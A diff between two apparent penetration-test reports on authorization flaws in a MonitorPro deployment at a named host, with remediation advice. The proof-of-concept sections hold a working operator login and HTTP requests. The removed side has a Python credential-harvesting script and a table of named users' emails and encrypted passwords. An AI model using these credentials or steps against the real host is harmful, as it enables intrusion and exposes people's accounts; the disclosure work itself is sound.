@@ -1,63 +1,32 @@
-# CryptoJS AES Encrypted User Passwords Exposed via User Management API
+# Broken Function Level Authorization - Operator Role Can Access Admin-Only User Management and Role Endpoints
 
-**ID:** vuln-0002
-**Severity:** CRITICAL
-**Found:** 2026-02-17 19:10:48 UTC
+**ID:** vuln-0003
+**Severity:** HIGH
+**Found:** 2026-02-17 19:12:26 UTC
 
 ## Description
 
-## Vulnerability Summary
-The MonitorPro application exposes all user passwords in CryptoJS AES encrypted format through the user management API endpoint. This is a critical information disclosure vulnerability as the passwords are using reversible encryption instead of proper one-way password hashing, and the endpoint lacks proper access controls allowing low-privilege operators to access all user credentials.
+## Summary
+The MonitorPro application at https://almaviva.monitorpro.ai/ suffers from Broken Function Level Authorization (BFLA) allowing users with the "operator" role to access administrative endpoints that should be restricted to admin users only. This enables lower-privileged users to view sensitive user data including encrypted passwords and system role configurations.
 
-## Affected Endpoint
-- **URL**: https://almaviva.monitorpro.ai/api/users/V2/maintenance/all
-- **Method**: GET
-- **Authentication**: Any authenticated user (admin OR operator role)
+## Vulnerability Details
 
-## Technical Details
+**Vulnerability Type:** Broken Function Level Authorization (BFLA) / OWASP API5:2023
+**CVSS v3.1 Score:** 7.5 (High)
+**CVSS Vector:** AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
 
-### Vulnerable Response
-The API returns user objects containing the `password` field with CryptoJS AES encrypted values:
+### Affected Endpoints
 
-```json
-{
-  "total": 8,
-  "total_pages": 1,
-  "current_page": 1,
-  "data": [
-    {
-      "_id": "5dcdc96f59f0d52f48207be1",
-      "username": "admin",
-      "email": "admin",
-      "password": "U2FsdGVkX19gvyWnbLjmV8mR3GsSc5YGZ1EFUukr6Ow=",
-      ...
-    },
-    ...
-  ]
-}
-```
+1. **GET /api/users/V2/maintenance/all** - User management endpoint that returns all user data including encrypted passwords
+2. **GET /api/roles** - Role definitions endpoint that exposes the entire permission structure
 
-### Exposed Encrypted Passwords (8 Users Total)
-| Username | Email | Encrypted Password |
-|----------|-------|-------------------|
-| admin | admin | U2FsdGVkX19gvyWnbLjmV8mR3GsSc5YGZ1EFUukr6Ow= |
-| null | null | U2FsdGVkX195TNxcCGhrLyUn6NTOj/ll |
-| supNull | supNull | U2FsdGVkX18FoqP/xw4DhozUrMy0AdKZ |
-| BOT | BOT | U2FsdGVkX19j7k/iQXLXuPS3HeJjHsZ3WoPlN8wneR8= |
-| LUIS MOZO | lmozo@almaviva.com.co | U2FsdGVkX19TVLMeXmUp9NieWRfr18a86yh0oPUgttE= |
-| CLAUDIA VARGAS | cplopez@almaviva.com.co | U2FsdGVkX1/m8tYSRiEx1aM64hVuy/7v3z+qmNypfRFNl4FpFXqQEg== |
-| TestIntrust | testintrust | U2FsdGVkX1/9lc+nPbze3g06QVEaaHR01WhkORcDtbM= |
-| johany chacon | jchacon@intrustsecurity.co | U2FsdGVkX18z61oXxZYsa+NQ4qO/V5x5 |
-
-### Encryption Analysis
-- **Format**: CryptoJS AES encrypted strings
-- **Base64 Decoded Prefix**: `Salted__` (8 bytes) followed by 8-byte salt and ciphertext
-- **Encryption Type**: Reversible symmetric encryption (NOT proper password hashing)
-- **Key Derivation**: CryptoJS uses EVP_BytesToKey with MD5 for key derivation
+### Affected Roles
+- **operator** role (lower privilege) can access admin-only data
+- Tested with user: jchacon@intrustsecurity.co
 
 ## Proof of Concept
 
-### Step 1: Login as Low-Privilege Operator
+### Step 1: Login as Operator
 ```http
 POST /api/users/login HTTP/1.1
 Host: almaviva.monitorpro.ai
@@ -66,82 +35,95 @@ Content-Type: application/json
 {"email":"jchacon@intrustsecurity.co","password":"test123"}
 ```
 
-### Step 2: Access User Management Endpoint
+**Response confirms operator role:**
+```json
+{
+  "user": {
+    "role": {
+      "name": "operator"
+    }
+  }
+}
+```
+
+### Step 2: Access User Management Endpoint (Should be Admin-Only)
 ```http
-GET /api/users/V2/maintenance/all?page=1&pageSize=100 HTTP/1.1
+GET /api/users/V2/maintenance/all?page=1&pageSize=10 HTTP/1.1
 Host: almaviva.monitorpro.ai
-Authorization: Bearer <operator_jwt_token>
+Authorization: Bearer [operator_jwt_token]
 ```
 
-### Step 3: Observe Encrypted Passwords in Response
-The response contains all 8 user accounts with their encrypted passwords.
-
-### Python Proof of Concept Script
-```python
-import requests
-import base64
-
-# Login as operator
-login_data = {"email": "jchacon@intrustsecurity.co", "password": "test123"}
-login_resp = requests.post("https://almaviva.monitorpro.ai/api/users/login", 
-                          json=login_data, verify=False)
-token = login_resp.json()['token']
-
-# Fetch all users with passwords
-headers = {"Authorization": f"Bearer {token}"}
-users_resp = requests.get("https://almaviva.monitorpro.ai/api/users/V2/maintenance/all", 
-                         headers=headers, verify=False)
-
-# Display exposed passwords
-for user in users_resp.json()['data']:
-    enc_pwd = user.get('password', 'N/A')
-    # Verify CryptoJS format
-    decoded = base64.b64decode(enc_pwd)
-    assert decoded[:8] == b'Salted__', "CryptoJS AES format confirmed"
-    print(f"User: {user['username']}, Encrypted Password: {enc_pwd}")
+**Response (HTTP 200 - VULNERABLE):**
+```json
+{
+  "total": 5,
+  "total_pages": 1,
+  "current_page": 1,
+  "data": [
+    {
+      "_id": "69738ea41303ec0014f7e14b",
+      "username": "LUIS MOZO",
+      "email": "lmozo@almaviva.com.co",
+      "password": "U2FsdGVkX19TVLMeXmUp9NieWRfr18a86yh0oPUgttE=",
+      "role": {"name": "admin"}
+    },
+    ...
+  ]
+}
 ```
 
-## Impact Assessment
+The operator can see:
+- 5 user accounts (including admin users)
+- Encrypted passwords (CryptoJS AES format)
+- User IDs, emails, and role assignments
 
-### Security Impact
-1. **Password Compromise Risk**: If the CryptoJS encryption key is discovered (potentially hardcoded in client-side JavaScript or brute-forceable), ALL user passwords can be decrypted
-2. **Broken Access Control**: Low-privilege operator accounts can access administrator credentials
-3. **Credential Theft**: Attackers with any valid account can harvest all encrypted passwords for offline cracking
-4. **Lateral Movement**: Compromised passwords enable access to other systems where users may reuse credentials
+### Step 3: Access Roles Endpoint (Should be Admin-Only)
+```http
+GET /api/roles HTTP/1.1
+Host: almaviva.monitorpro.ai
+Authorization: Bearer [operator_jwt_token]
+```
 
-### Business Impact
-- Complete authentication system compromise
-- Potential unauthorized access to all user accounts
-- Regulatory compliance violations (GDPR, PCI-DSS, SOC2)
-- Reputational damage if user credentials are leaked
+**Response (HTTP 200 - VULNERABLE):**
+```json
+[
+  {"_id": "...", "name": "operator", "permissions": [13 items]},
+  {"_id": "...", "name": "supervisor", "permissions": [19 items]},
+  {"_id": "...", "name": "admin", "permissions": [53 items]},
+  {"_id": "...", "name": "despachador", "permissions": [...]}
+]
+```
 
-## CVSS Score
-**CVSS 3.1 Base Score: 9.1 (Critical)**
-- Attack Vector: Network (AV:N)
-- Attack Complexity: Low (AC:L)
-- Privileges Required: Low (PR:L)
-- User Interaction: None (UI:N)
-- Scope: Changed (S:C)
-- Confidentiality Impact: High (C:H)
-- Integrity Impact: High (I:H)
-- Availability Impact: None (A:N)
+The operator can view the complete role hierarchy and permission structure.
 
-## Remediation Recommendations
+## Impact
+
+1. **Vertical Privilege Escalation:** Lower-privileged operator users can access administrative data and functionality
+2. **Sensitive Data Exposure:** Encrypted passwords of all users (including admins) are exposed to operators
+3. **Information Disclosure:** Complete role and permission structure is visible to all authenticated users
+4. **Credential Theft Risk:** If the encryption key is compromised, all user passwords could be decrypted
+5. **Reconnaissance Aid:** Attackers with operator access can map the entire permission system
+6. **Compliance Violation:** Violates principle of least privilege and data protection requirements
+
+## Root Cause
+The API endpoints lack proper role-based access control (RBAC) enforcement. The backend accepts requests from any authenticated user without verifying if the user's role has permission to access the requested resource.
+
+## Remediation
 
 ### Immediate Actions
-1. **Remove password field from API responses** - Never return passwords (encrypted or otherwise) to clients
-2. **Implement proper access control** - Restrict user management endpoints to admin role only
-3. **Audit access logs** - Review who has accessed this endpoint
+1. Implement server-side RBAC checks on all administrative endpoints
+2. Restrict `/api/users/V2/maintenance/all` to admin role only
+3. Restrict `/api/roles` to admin role only or remove sensitive permission details
 
-### Long-term Fixes
-1. **Use proper password hashing** - Replace CryptoJS AES encryption with bcrypt, Argon2, or scrypt
-2. **Never store reversible passwords** - Passwords should be one-way hashed with salt
-3. **Implement field-level authorization** - Sensitive fields should be excluded from API responses based on role
-4. **API security review** - Audit all endpoints for similar information disclosure issues
+### Long-term Recommendations
+1. Implement centralized authorization middleware that enforces role-based permissions
+2. Apply deny-by-default policy - explicitly grant access rather than implicitly allow
+3. Audit all API endpoints for proper authorization enforcement
+4. Never expose encrypted/hashed passwords via any API endpoint
+5. Implement API endpoint documentation with required permission levels
+6. Add authorization unit tests for all protected endpoints
 
 ## References
-- CWE-312: Cleartext Storage of Sensitive Information
-- CWE-522: Insufficiently Protected Credentials
-- CWE-916: Use of Password Hash With Insufficient Computational Effort
-- OWASP API Security Top 10 - API3:2023 Broken Object Property Level Authorization
-- OWASP Cryptographic Storage Cheat Sheet
+- OWASP API Security Top 10 2023 - API5: Broken Function Level Authorization
+- CWE-285: Improper Authorization
+- CWE-863: Incorrect Authorization
